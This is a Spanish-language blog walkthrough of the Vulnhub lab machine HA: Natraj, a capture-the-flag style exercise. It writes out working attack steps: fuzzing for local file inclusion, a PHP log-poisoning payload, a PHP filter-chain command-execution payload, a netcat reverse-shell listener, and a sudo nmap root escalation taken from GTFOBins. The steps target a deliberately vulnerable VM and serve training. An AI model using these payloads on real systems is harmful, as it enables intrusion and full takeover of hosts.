---
title: "HA: Natraj - Vulnhub"
layout: post
date: 2024-01-22 15:10
tags:
  - Vulnhub
  - Natraj
  - LFI
  - Log
  - Poisoning
  - PHP
  - RCE
  - Apache
  - abusing
  - Nmap
  - PrivEsc
image: /assets/images/vulnhub/Natraj/natraj.jpeg
headerImage: true
projects: false
hidden: false
description: Natraj - Vunlhub
category: blog
author: CAHOn3R
externalLink: false
---

# Enumeración
Como siempre que hacemos una máquina que estamos corriendo en local empezamos con **arp-scan** para detectar la **IP**.
```bash
arp-scan -I eth0 --localnet --ignoredups

192.168.0.32	00:0c:29:3f:59:d9	VMware, Inc.
```

Tenemos **IP**, vamos con el escaneo de puertos mediante **nmap**.
```bash
nmap -p- -sS --min-rate 5000 --open -n -Pn -oG allPorts 192.168.0.32

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http

-p- # para escanear los 65535 puertos que existen
-sS # para realizar un escaneo tipo "SYN scan"
--min-rate 5000 # para indicarle no se envien menos de 5k paquetes por segundo
--open # para que solo reporte puertos abiertos
-vvv # para que muestre por consola lo máximo posible y lo antes posible
-n # para realizar un escaneo prescindiendo de la resolución de nombres de dominio
-Pn # para que no realice la detección del estado del host antes de iniciar el escaneo
-oG # para especificar un formato de salida en modo greppable en el archivo allPorts
```

Lanzamos los scripts básicos de reconocimiento para ver que versiones y servicios corren para estos puertos.
```bash
nmap -sCV -p 22,25,80,139,445 192.168.0.11 -oN targeted
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92 (RSA)
|   256 bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71 (ECDSA)
|_  256 f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA:Natraj
MAC Address: 00:0C:29:F7:0C:77 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que en el puerto 80 está corriendo un servidor web con Apache y en el 22 SSH, lo normal. Así que empiezo con el escaneo de directorios, esta vez con **Feroxbuster**, por cambiar...

[<img src="/assets/images/vulnhub/Natraj/captura1.png">](/assets/images/vulnhub/Natraj/captura1.png)

Hay algo que llama especialmente mi atención, un directorio "console" y un archivo **PHP**, nada más verlo pienso que puede ser un **web-shell**, y pruebo cosas como estas:
```bash
http://192.168.0.32/console/file.php?cmd=id
http://192.168.0.32/console/file.php?0=id
http://192.168.0.32/console/file.php?web=id
http://192.168.0.32/console/file.php?c=id
```

Al no resultar pruebo a **fuzzear** el parámetro con **wfuzz**.
```bash
❯ wfuzz -c -t 200 --hc 403 --hl 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://192.168.0.32/console/file.php?FUZZ=/etc/passwd'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.0.32/console/file.php?FUZZ=/etc/passwd
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                       
=====================================================================

000000312:   200        27 L     35 W       1398 Ch     "file"                
```
_Realmente esta parte la saqué con guessing, me pareció algo obvio, pero prefiero explicar como se podría haber hecho._

Una vez descubierto este parámetro me puse a buscar archivos que me permitan ganar acceso al sistema como un id_rsa por ejemplo, pero no era el caso. Lo siguiente que se me ocurrió fue buscar logs, ya que tenemos el puerto 22(SSH) abierto, así que fuzzee rutas de logs.
```bash
❯ gobuster fuzz -t 200 -w /usr/share/wordlists/Logs-wordlist.txt -u 'http://192.168.0.32/console/file.php?file=FUZZ' -b 301,400 --exclude-length 0
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.32/console/file.php?file=FUZZ
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/Logs-wordlist.txt
[+] Excluded Status codes:   301,400
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=41879] [Word=/var/log/auth.log] http://192.168.0.32/console/file.php?file=/var/log/auth.log

===============================================================
Finished
===============================================================

```

# Explotación

Vemos un archivo con logs del servicio SSH, automáticamente me viene a la cabeza **logpoisoning**, pero me encuentro con una barrea, una barrera que nunca me había surgido y es mi propio sistema, yo he explotado bastantes veces **logpoisoning**, pero esta vez, no se si por la versión de **SSH** que es más reciente o porque, no podía mandar el código **PHP** mediante el user de SSH y que me lo interpretara la web, así que busque otra opción...

[<img src="/assets/images/vulnhub/Natraj/captura2.png">](/assets/images/vulnhub/Natraj/captura2.png)

La práctica me dice que puedo mediante el usuario de **SSH** ejecutar código **PHP** en el servidor web, ya que me lo debería interpretar la web, pero mi propio **SSH** no me permite mandar caracteres especiales como nombre de usuario.
```bash
❯ ssh "<?php system('whoami'); ?>"@192.168.0.32
remote username contains invalid characters
```

Así que se me ocurre volver a abusar del **php_filter_chain_generator.py** como en la máquina [Symfonos1](https://cahon3r.github.io//Symfonos1-Vulnhub/).

Capturamos la petición con **burpsuite**, lo mandamos al **repeater** y, por otro lado, generamos el código.
```bash
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`; ?>'
```
_La idea es generar un código lo más corto posible que nos permita ejecutar comandos, si es demasiado largo el output que nos genera el script, el servidor web lo rechazara._

El output que nos genera lo utilizamos de la siguiente forma y nos entablamos una **reverse shell** con bash por ejemplo:

[<img src="/assets/images/vulnhub/Natraj/captura3.png">](/assets/images/vulnhub/Natraj/captura3.png)
_Utilizamos el símbolo "&" antes del parámetro 0 por qué ya hay un "?" en la URL_

Nos ponemos en escucha con **Netcat** en el puerto 443 y entablamos la reverse shell.

```bash
nc -nlvp 443
```

De este modo estamos dentro de la máquina como **www-data**.

# PrivEsc

Una vez dentro de la máquina víctima enumero con **LinPeas** y encuentro el archivo de configuración de **apache** con el cual podemos hacer que el servidor web se ejecute como otro usuario que no sea **www-data**.
[<img src="/assets/images/vulnhub/Natraj/captura4.png">](/assets/images/vulnhub/Natraj/captura4.png)

Procedo a abrir el archivo con **nano** y a modificar la parte que se encarga de establecer un usuario al servicio.
```bash
# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}
```

Esto lo sustituimos por uno de los usuarios que encontramos a nivel de sistema.
```bash
# These need to be set in /etc/apache2/envvars
User mahakal           
Group mahakal           
```

Ahora reiniciamos el servicio y se debería ejecutar como el usuario **mahakal**, procedemos a volver a lanzar la reverse shell que tenemos en el **repeater** de **Burpsuite** y esta vez ganamos acceso como **mahakal**.

Ahora siendo **mahakal** hacemos **sudo -l** y vemos que podemos ejecutar **nmap** como el usuario **root** sin proporcionar contraseña.
```bash
mahakal@ubuntu:/var/www/html/console$ sudo -l
sudo -l
Matching Defaults entries for mahakal on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mahakal may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nmap
```

Nos vamos a [gtfobins](https://gtfobins.github.io/gtfobins/nmap/#sudo) y vemos que con sudo ejecutando los siguientes comandos podemos escalar privilegios.
```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

Lo pegamos y ya somos **root**.
